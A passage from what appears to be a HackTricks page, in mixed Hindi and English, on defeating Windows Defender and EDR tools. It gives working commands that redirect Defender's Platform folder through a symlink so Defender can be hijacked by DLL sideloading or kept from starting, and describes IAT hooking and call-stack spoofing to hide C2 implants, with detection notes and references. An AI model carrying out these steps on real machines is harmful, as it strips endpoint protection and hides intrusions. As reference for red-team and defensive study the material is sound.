- Local Administrator (Platform फ़ोल्डर के अंतर्गत directories/symlinks बनाने के लिए आवश्यक)
- Reboot करने की क्षमता या Defender platform पुनः-चयन trigger करने की क्षमता (boot पर service restart)
- केवल built-in tools की आवश्यकता (mklink)

क्यों यह काम करता है
- Defender अपनी फ़ोल्डरों में लिखने को ब्लॉक करता है, लेकिन उसका platform selection directory entries पर भरोसा करता है और lexicographically सबसे उच्च version चुन लेता है बिना यह validate किए कि target एक protected/trusted path पर resolve होता है या नहीं।

कदम-ब-कदम (उदाहरण)
1) वर्तमान platform फ़ोल्डर की एक writable clone तैयार करें, उदाहरण: `C:\TMP\AV`:
```cmd
set SRC="C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25070.5-0"
set DST="C:\TMP\AV"
robocopy %SRC% %DST% /MIR
```
2) अपने फ़ोल्डर की ओर इशारा करते हुए Platform के अंदर एक higher-version डायरेक्टरी symlink बनाएं:
```cmd
mklink /D "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0" "C:\TMP\AV"
```
3) ट्रिगर चयन (reboot अनुशंसित):
```cmd
shutdown /r /t 0
```
4) सत्यापित करें कि MsMpEng.exe (WinDefend) रिडायरेक्ट किए गए पथ से चलता है:
```powershell
Get-Process MsMpEng | Select-Object Id,Path
# or
wmic process where name='MsMpEng.exe' get ProcessId,ExecutablePath
```
आपको `C:\TMP\AV\` के तहत नया process path और उस स्थान को दर्शाती service configuration/registry दिखाई देनी चाहिए।

Post-exploitation options
- DLL sideloading/code execution: Drop/replace DLLs जिन्हें Defender अपने application directory से लोड करता है ताकि Defender के processes में code execute किया जा सके। ऊपर के सेक्शन को देखें: [DLL Sideloading & Proxying](#dll-sideloading--proxying).
- Service kill/denial: Remove the version-symlink ताकि अगली बार start पर configured path resolve न हो और Defender start होने में विफल रहे:
```cmd
rmdir "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0"
```
> [!TIP]
> ध्यान दें कि यह तकनीक स्वयं में privilege escalation प्रदान नहीं करती; इसके लिए admin rights आवश्यक हैं।

## API/IAT Hooking + Call-Stack Spoofing with PIC (Crystal Kit-style)

Red teams runtime evasion को C2 implant से target module के अंदर शिफ्ट कर सकते हैं, इसके Import Address Table (IAT) को hook करके और चयनित APIs को attacker‑controlled, position‑independent code (PIC) के माध्यम से route करके। यह evasion को उन छोटे API surface से परे सामान्य बनाता जो कई kits expose करते हैं (e.g., CreateProcessA), और वही protections BOFs और post‑exploitation DLLs तक भी फैलाता है।

High-level approach
- Stage a PIC blob alongside the target module using a reflective loader (prepended or companion). PIC self‑contained और position‑independent होना चाहिए।
- जब host DLL लोड होती है, उसके IMAGE_IMPORT_DESCRIPTOR को पार करते हुए targeted imports के लिए IAT entries (e.g., CreateProcessA/W, CreateThread, LoadLibraryA/W, VirtualAlloc) को patch करके thin PIC wrappers की तरफ point करें।
- Each PIC wrapper वास्तविक API पते को tail‑call करने से पहले evasions क्रियान्वित करता है। सामान्य evasions में शामिल हैं:
  - call के चारों ओर Memory mask/unmask (जैसे, beacon regions को encrypt करना, RWX→RX, page names/permissions बदलना) और फिर post‑call restore।
  - Call‑stack spoofing: एक benign stack बनाकर target API में transition करें ताकि call‑stack analysis अपेक्षित frames को resolve करे।
- Compatibility के लिए, एक interface export करें ताकि एक Aggressor script (or equivalent) यह register कर सके कि Beacon, BOFs और post‑ex DLLs के लिए कौन‑से APIs hook किए जाएँ।

Why IAT hooking here
- यह hooked import का उपयोग करने वाले किसी भी code पर काम करता है, tool code को modify किए बिना या Beacon पर specific APIs को proxy करने के लिए निर्भर हुए बिना।
- post‑ex DLLs को कवर करता है: LoadLibrary* को hook करने से आप module loads (e.g., System.Management.Automation.dll, clr.dll) को intercept कर सकते हैं और उनके API calls पर वही masking/stack evasion लागू कर सकते हैं।
- CreateProcessA/W को wrap करके यह call‑stack–based detections के खिलाफ process‑spawning post‑ex commands के विश्वसनीय उपयोग को पुनर्स्थापित करता है।

Minimal IAT hook sketch (x64 C/C++ pseudocode)
```c
// For each IMAGE_IMPORT_DESCRIPTOR
//  For each thunk in the IAT
//    if imported function == "CreateProcessA"
//       WriteProcessMemory(local): IAT[idx] = (ULONG_PTR)Pic_CreateProcessA_Wrapper;
// Wrapper performs: mask(); stack_spoof_call(real_CreateProcessA, args...); unmask();
```
नोट्स
- relocations/ASLR के बाद और import के पहले उपयोग से पहले patch लागू करें। TitanLdr/AceLdr जैसे Reflective loaders लोड किए गए मॉड्यूल के DllMain के दौरान hooking दिखाते हैं।
- wrappers को छोटा और PIC-safe रखें; वास्तविक API को उस मूल IAT मान के माध्यम से resolve करें जिसे आपने पैच करने से पहले capture किया था या LdrGetProcedureAddress के जरिए।
- PIC के लिए RW → RX transitions का उपयोग करें और writable+executable पेज्स न छोड़ें।

Call‑stack spoofing स्टब
- Draugr‑style PIC stubs एक नकली कॉल चेन बनाते हैं (रिटर्न एड्रेसेस benign मॉड्यूल्स में) और फिर वास्तविक API में pivot करते हैं।
- यह उन detections को विफल कर देता है जो Beacon/BOFs से sensitive APIs तक के canonical stacks की उम्मीद करते हैं।
- stack cutting/stack stitching techniques के साथ जोड़ें ताकि API prologue से पहले अपेक्षित frames के अंदर land किया जा सके।

ऑपरेशनल इंटीग्रेशन
- Reflective loader को post‑ex DLLs के आगे रखें ताकि DLL लोड होने पर PIC और hooks स्वतः initialise हो जाएं।
- Aggressor script का उपयोग target APIs को register करने के लिए करें ताकि Beacon और BOFs बिना कोड परिवर्तन के उसी evasion path का पारदर्शी लाभ उठा सकें।

Detection/DFIR विचार
- IAT integrity: वे एंट्रियाँ जो non‑image (heap/anon) addresses पर resolve होती हैं; import pointers का आवधिक सत्यापन।
- Stack anomalies: रिटर्न एड्रेसेस जो लोडेड images से संबंधित नहीं हैं; non‑image PIC में अचानक transitions; असंगत RtlUserThreadStart ancestry।
- Loader telemetry: IAT में in‑process writes, import thunks को modify करने वाली early DllMain activity, लोड के समय बनाए गए unexpected RX regions।
- Image‑load evasion: यदि LoadLibrary* को hook किया जा रहा है, तो memory masking events के साथ correlated suspicious loads of automation/clr assemblies पर नज़र रखें।

संबंधित बिल्डिंग ब्लॉक्स और उदाहरण
- Reflective loaders जो लोड के दौरान IAT पैचिंग करते हैं (e.g., TitanLdr, AceLdr)
- Memory masking hooks (e.g., simplehook) और stack‑cutting PIC (stackcutting)
- PIC call‑stack spoofing stubs (e.g., Draugr)

## References

- [Crystal Kit – blog](https://rastamouse.me/crystal-kit/)
- [Crystal-Kit – GitHub](https://github.com/rasta-mouse/Crystal-Kit)
- [Elastic – Call stacks, no more free passes for malware](https://www.elastic.co/security-labs/call-stacks-no-more-free-passes-for-malware)
- [Crystal Palace – docs](https://tradecraftgarden.org/docs.html)
- [simplehook – sample](https://tradecraftgarden.org/simplehook.html)
- [stackcutting – sample](https://tradecraftgarden.org/stackcutting.html)
- [Draugr – call-stack spoofing PIC](https://github.com/NtDallas/Draugr)

- [Unit42 – New Infection Chain and ConfuserEx-Based Obfuscation for DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [Synacktiv – Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [Check Point Research – Before ToolShell: Exploring Storm-2603’s Previous Ransomware Operations](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [Hexacorn – DLL ForwardSideLoading: Abusing Forwarded Exports](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [Windows 11 Forwarded Exports Inventory (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [Microsoft Docs – Known DLLs](https://learn.microsoft.com/windows/win32/dlls/known-dlls)
- [Microsoft – Protected Processes](https://learn.microsoft.com/windows/win32/procthread/protected-processes)
- [Microsoft – EKU reference (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [CreateProcessAsPPL launcher](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [Zero Salarium – Countering EDRs With The Backing Of Protected Process Light (PPL)](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)
- [Zero Salarium – Break The Protective Shell Of Windows Defender With The Folder Redirect Technique](https://www.zerosalarium.com/2025/09/Break-Protective-Shell-Windows-Defender-Folder-Redirect-Technique-Symlink.html)
- [Microsoft – mklink command reference](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)

- [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)

{{#include ../banners/hacktricks-training.md}}
